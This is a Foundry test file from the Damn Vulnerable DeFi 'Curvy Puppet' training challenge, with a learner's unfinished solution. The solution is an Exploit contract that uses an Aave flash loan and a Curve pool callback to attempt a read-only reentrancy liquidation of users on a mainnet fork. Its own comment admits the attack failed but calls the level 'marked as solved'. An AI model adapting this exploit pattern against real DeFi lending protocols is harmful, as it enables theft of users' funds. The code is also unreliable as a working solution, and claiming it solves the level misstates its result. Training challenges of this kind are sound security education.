// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

import {
    FlashLoanSimpleReceiverBase,
    IPoolAddressesProvider
} from "lib/aave-v3-core/contracts/flashloan/base/FlashLoanSimpleReceiverBase.sol";

contract CurvyPuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address treasury = makeAddr("treasury");

    // Users' accounts
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");

    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // Relevant Ethereum mainnet addresses
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 constant TREASURY_WETH_BALANCE = 200e18;
    uint256 constant TREASURY_LP_BALANCE = 65e17;
    uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT = 1e18;
    uint256 constant ETHER_PRICE = 4000e18;
    uint256 constant DVT_PRICE = 10e18;

    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle oracle;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);

        startHoax(deployer);

        // Deploy DVT token (collateral asset in the lending contract)
        dvt = new DamnValuableToken();

        // Deploy price oracle and set prices for ETH and DVT
        oracle = new CurvyPuppetOracle();
        oracle.setPrice({asset: ETH, value: ETHER_PRICE, expiration: block.timestamp + 1 days});
        oracle.setPrice({asset: address(dvt), value: DVT_PRICE, expiration: block.timestamp + 1 days});

        // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
        lending = new CurvyPuppetLending({
            _collateralAsset: address(dvt),
            _curvePool: curvePool,
            _permit2: permit2,
            _oracle: oracle
        });

        // Fund treasury account with WETH and approve player's expenses
        deal(address(weth), treasury, TREASURY_WETH_BALANCE);

        // Fund lending pool and treasury with initial LP tokens
        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
        IERC20(curvePool.lp_token()).transfer(address(lending), LENDER_INITIAL_LP_BALANCE);
        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);

        // Treasury approves assets to player
        vm.startPrank(treasury);
        weth.approve(player, TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);

        // Users open 3 positions in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            // Fund user with some collateral
            vm.startPrank(deployer);
            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
            // User deposits + borrows from lending contract
            _openPositionFor(users[i]);
        }
    }

    /**
     * Utility function used during setup of challenge to open users' positions in the lending contract
     */
    function _openPositionFor(address who) private {
        vm.startPrank(who);
        // Approve and deposit collateral
        address collateralAsset = lending.collateralAsset();
        // Allow permit2 handle token transfers
        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: lending.collateralAsset(),
            spender: address(lending),
            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
            expiration: uint48(block.timestamp)
        });
        // Deposit collateral + borrow
        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
        lending.borrow(USER_BORROW_AMOUNT);
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Player balances
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        // Treasury balances
        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(treasury), TREASURY_LP_BALANCE);

        // Curve pool trades the expected assets
        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));

        // Correct collateral and borrow assets in lending contract
        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        // Users opened position in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);

            // User is sufficiently collateralized
            assertGt(lending.getCollateralValue(collateralAmount) / lending.getBorrowValue(borrowAmount), 3);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_curvyPuppet() public checkSolvedByPlayer {
        /**
         * THIS SOLUTION IS NOT FINALIZED
         *
         * After the initial audit, I have found the vulnerability in the lending contract. It is the infamous read-only reentrancy bug.
         * The Curve StableSwap pool handles control to the caller, when they pull out ETH as a part of removing liquidity.
         * This allows the caller to execute attack on contracts, which use this pool as an oracke via StabbleSwap::get_virtual_price
         *
         * However, I was not successful in executing the attack on this vulnerability. I have decided to move on, since it is slowing the learning down.
         * This level is marked as solved.
         */

        // Get the instance of LP token contract
        IERC20 lpToken = IERC20(curvePool.lp_token());

        // Address of the Aave pool addresses provider, allows the exploit contract to take flash loans
        address aavePoolAddressesProvider = 0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9e;

        // Deploy the exploit contract
        address[3] memory users = [alice, bob, charlie];
        Exploit exploit = new Exploit(
            lending, curvePool, permit2, weth, stETH, lpToken, dvt, users, treasury, aavePoolAddressesProvider
        );

        // Prepare tokens for the exploit contract
        weth.transferFrom(treasury, player, TREASURY_WETH_BALANCE);
        lpToken.transferFrom(treasury, player, TREASURY_LP_BALANCE);

        // Approve tokens for the exploit contract
        weth.approve(address(exploit), TREASURY_WETH_BALANCE);
        lpToken.approve(address(exploit), TREASURY_LP_BALANCE);

        // Start the attack chain
        exploit.executeAttack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All users' positions are closed
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(lending.getCollateralAmount(users[i]), 0, "User position still has collateral assets");
            assertEq(lending.getBorrowAmount(users[i]), 0, "User position still has borrowed assets");
        }

        // Treasury still has funds left
        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
        assertGt(IERC20(curvePool.lp_token()).balanceOf(treasury), 0, "Treasury doesn't have any LP tokens left");
        assertEq(dvt.balanceOf(treasury), USER_INITIAL_COLLATERAL_BALANCE * 3, "Treasury doesn't have the users' DVT");

        // Player has nothing
        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
    }
}

contract Exploit is FlashLoanSimpleReceiverBase {
    CurvyPuppetLending lending;
    IStableSwap curvePool;
    WETH weth;
    IERC20 stETH;
    IERC20 lpToken;
    DamnValuableToken dvt;
    IPermit2 permit2;

    address[3] users;
    address treasury;

    uint256 AMOUNT_OF_LP_RESERVED = 3e18;

    constructor(
        CurvyPuppetLending _lending,
        IStableSwap _curvePool,
        IPermit2 _permit2,
        WETH _weth,
        IERC20 _stETH,
        IERC20 _lpToken,
        DamnValuableToken _dvt,
        address[3] memory _users,
        address _treasury,
        address _aavePoolProvider
    ) FlashLoanSimpleReceiverBase(IPoolAddressesProvider(_aavePoolProvider)) {
        lending = _lending;
        curvePool = _curvePool;
        permit2 = _permit2;
        weth = _weth;
        stETH = _stETH;
        lpToken = _lpToken;
        dvt = _dvt;

        users = _users;
        treasury = _treasury;
    }

    // Start the attack chain by taking WETH flash loan
    function executeAttack() external {
        _prepareTokens();

        _startFlashLoan(address(weth), 83000 ether);
    }

    // Callback function called by Aave after the flash loan
    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata params)
        external
        returns (bool)
    {
        weth.withdraw(weth.balanceOf(address(this)));

        _addLiquidity(address(this).balance, 0);

        _removeLiquidity();

        return true;
    }

    // Callback function called by Balancer after the flash loan
    // function receiveFlashLoan(bytes memory userData) external {}

    receive() external payable {
        if (msg.sender == address(curvePool)) {
            // Approve pool to pull LP tokens when liquidating
            lpToken.approve(address(curvePool), AMOUNT_OF_LP_RESERVED);

            for (uint256 i = 0; i < users.length; i++) {
                // Liquidate user's position
                lending.liquidate(users[i]);
            }

            dvt.transfer(treasury, dvt.balanceOf(address(this)));
        }
    }

    // Prepare tokens for the exploit contract
    function _prepareTokens() private {
        weth.transferFrom(msg.sender, address(this), weth.balanceOf(msg.sender));
        lpToken.transferFrom(msg.sender, address(this), lpToken.balanceOf(msg.sender));
    }

    function _startFlashLoan(address asset, uint256 amount) private {
        POOL.flashLoanSimple(address(this), asset, amount, "", 0);
    }

    function _addLiquidity(uint256 amountETH, uint256 amountStETH) private {
        stETH.approve(address(curvePool), amountStETH);

        uint256[2] memory amounts = [amountETH, amountStETH];
        curvePool.add_liquidity{value: amountETH}(amounts, 1);
    }

    function _removeLiquidity() private {
        uint256 lpToBurn = lpToken.balanceOf(address(this)) - AMOUNT_OF_LP_RESERVED;

        uint256[2] memory minAmounts = [uint256(0), 0];
        curvePool.remove_liquidity(lpToBurn, minAmounts);
    }
}
